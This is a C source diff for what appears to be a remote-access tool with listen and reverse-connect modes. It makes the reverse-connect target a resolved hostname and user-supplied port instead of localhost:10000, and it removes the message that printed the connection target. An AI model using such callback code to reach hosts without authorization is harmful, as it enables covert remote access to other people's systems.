@@ -160,6 +160,7 @@ out:
 static void 
 reverse_connect(char *address) {
 	struct sockaddr_in client_addr;
+	struct hostent * phost;
 	char * hostname;
 	unsigned short port;
 	int i;
@@ -188,10 +189,13 @@ reverse_connect(char *address) {
 	struct sockaddr_in server_addr;
 	bzero(&server_addr,sizeof(server_addr));
 	server_addr.sin_family = AF_INET;
-
-	if(inet_aton("127.0.0.1",&server_addr.sin_addr) == 0) 
-		fatalperror(2,"inet_aton");
-	server_addr.sin_port = htons(10000);
+	phost = gethostbyname(hostname);
+	if(phost == NULL) 
+		fatalperror(2,"gethostbyname");
+	bcopy( (char *)phost->h_addr, (char *)&server_addr.sin_addr, phost->h_length );
+	//if(inet_aton(hostname,&server_addr.sin_addr) == 0) 
+	//	fatalperror(2,"inet_aton");
+	server_addr.sin_port = htons(port);
 	socklen_t server_addr_length = sizeof(server_addr);
 
 	if(connect(client_socket,(struct sockaddr*)&server_addr, server_addr_length) < 0)
@@ -255,7 +259,6 @@ main(int argc, char *argv[], char *env[])
 		wait_for_connection(listen_port); /* -l */
 	} else {
 		if(reverse_addr) { /* -r */
-			printf("Reverse connect: %s\n",reverse_addr);
 			reverse_connect(reverse_addr);
 		} else
 			wait_for_connection(listen_port); /* neither -l -r */
